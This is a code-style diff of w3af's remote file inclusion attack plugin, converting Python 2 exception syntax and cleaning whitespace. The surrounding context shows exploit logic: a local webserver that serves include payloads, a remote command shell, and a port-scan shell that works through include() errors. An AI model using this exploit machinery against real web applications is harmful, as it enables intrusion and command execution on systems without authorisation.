@@ -102,7 +102,7 @@ class rfi(AttackPlugin):
                   ' vulnerable Web application.'
             om.out.error(msg)
             return False
-        
+
         if self._listen_address and self._listen_port:
             # Start local webserver, raise an exception if something
             # fails
@@ -111,12 +111,12 @@ class rfi(AttackPlugin):
                 webserver.start_webserver(self._listen_address,
                                           self._listen_port,
                                           webroot_path)
-            except socket.error, se:
+            except socket.error as se:
                 msg = 'Failed to start the local web server to exploit the'\
                       ' RFI vulnerability, the exception was: "%s".'
                 om.out.error(msg % se)
                 return False
-            
+
         return True
 
     def _verify_xss_vuln(self):
@@ -150,7 +150,7 @@ class rfi(AttackPlugin):
 
             try:
                 http_res = self._uri_opener.send_mutant(xss_mutant)
-            except:
+            except BaseException:
                 continue
             else:
                 if test_string in http_res.get_body():
@@ -165,7 +165,7 @@ class rfi(AttackPlugin):
                   ' capabilities was found. The exploit will use a local'\
                   ' web server.'
             om.out.console(msg)
-        
+
         return False
 
     def get_attack_type(self):
@@ -239,7 +239,7 @@ class rfi(AttackPlugin):
 
             try:
                 http_res = self._uri_opener.send_mutant(mutant)
-            except:
+            except BaseException:
                 continue
             else:
                 if shell_handler.SHELL_IDENTIFIER in http_res.body:
@@ -253,7 +253,7 @@ class rfi(AttackPlugin):
             #
             #  We get here when it was impossible to create a RFI shell, but we
             #  still might be able to do some interesting stuff through error
-            #  messages shown by the web application  
+            #  messages shown by the web application
             #
             mutant = vuln.get_mutant()
             mutant = mutant.copy()
@@ -262,7 +262,7 @@ class rfi(AttackPlugin):
 
             try:
                 http_response = self._uri_opener.send_mutant(mutant)
-            except:
+            except BaseException:
                 return False
             else:
                 rfi_errors = ['php_network_getaddresses: getaddrinfo',
@@ -292,8 +292,9 @@ class rfi(AttackPlugin):
                 file_handler = open(filepath, 'w')
                 file_handler.write(file_content)
                 file_handler.close()
-            except:
-                raise BaseFrameworkException('Could not create file in webroot.')
+            except BaseException:
+                raise BaseFrameworkException(
+                    'Could not create file in webroot.')
             else:
                 url_to_include = 'http://%s:%s/%s' % (self._listen_address,
                                                       self._listen_port,
@@ -316,26 +317,31 @@ class rfi(AttackPlugin):
         :return: A list of option objects for this plugin.
         """
         ol = OptionList()
-        
+
         d = 'IP address that the webserver will use to receive requests'
         h = 'w3af runs a webserver to serve the files to the target web app'\
             ' when doing remote file inclusions. This setting configures on'\
             ' what IP address the webserver is going to listen.'
-        o = opt_factory('listen_address', self._listen_address, d, 'ip', help=h)
+        o = opt_factory(
+            'listen_address',
+            self._listen_address,
+            d,
+            'ip',
+            help=h)
         ol.add(o)
-        
+
         d = 'Port that the webserver will use to receive requests'
         h = 'w3af runs a webserver to serve the files to the target web app'\
             ' when doing remote file inclusions. This setting configures on'\
             ' what IP address the webserver is going to listen.'
         o = opt_factory('listen_port', self._listen_port, d, 'port', help=h)
         ol.add(o)
-        
+
         d = 'Instead of including a file in a local webserver; include the '\
             ' result of exploiting a XSS bug within the same target site.'
         o = opt_factory('use_xss_bug', self._use_XSS_vuln, d, 'boolean')
         ol.add(o)
-        
+
         return ol
 
     def set_options(self, options_list):
@@ -379,6 +385,7 @@ class PortScanShell(Shell):
     RFIShell, AND the "include()" method is showing errors, allowing me to
     determine if a port is open or not.
     """
+
     def __init__(self, vuln, uri_opener, worker_pool, exploit_mutant):
         """
         Create the obj
@@ -395,9 +402,9 @@ class PortScanShell(Shell):
 
         try:
             http_response = self._uri_opener.send_mutant(mutant)
-        except BaseFrameworkException, w3:
+        except BaseFrameworkException as w3:
             return 'Exception from the remote web application: "%s"' % w3
-        except Exception, e:
+        except Exception as e:
             return 'Unhandled exception, "%s"' % e
         else:
             if 'HTTP request failed!' in http_response.get_body():
@@ -414,7 +421,7 @@ class PortScanShell(Shell):
 
     def get_name(self):
         return 'portscan-shell object'
-    
+
     def identify_os(self):
         self._rOS = 'unknown'
         self._rSystem = 'PHP'
@@ -457,6 +464,7 @@ class RFIShell(ExecShell, PortScanShell):
     when the attack plugin was configured to use XSS vulnerabilities to exploit
     the RFI and a XSS vulnerability was actually found.
     """
+
     def __init__(self, vuln, uri_opener, worker_pool, exploit_mutant):
         PortScanShell.__init__(self, vuln, uri_opener, worker_pool,
                                exploit_mutant)
@@ -480,9 +488,9 @@ class RFIShell(ExecShell, PortScanShell):
 
         try:
             http_res = self._uri_opener.send_mutant(mutant)
-        except BaseFrameworkException, w3:
+        except BaseFrameworkException as w3:
             return 'Exception from the remote web application: "%s"' % w3
-        except Exception, e:
+        except Exception as e:
             return 'Unhandled exception from the remote web application: "%s"' % e
         else:
             return shell_handler.extract_result(http_res.get_body())
@@ -494,7 +502,7 @@ class RFIShell(ExecShell, PortScanShell):
         om.out.debug('Remote file inclusion shell is cleaning up.')
         try:
             self._rm_file(self._exploit_mutant.get_token_value())
-        except Exception, e:
+        except Exception as e:
             msg = 'Remote file inclusion shell cleanup failed with exception: %s'
             om.out.error(msg % e)
         else:
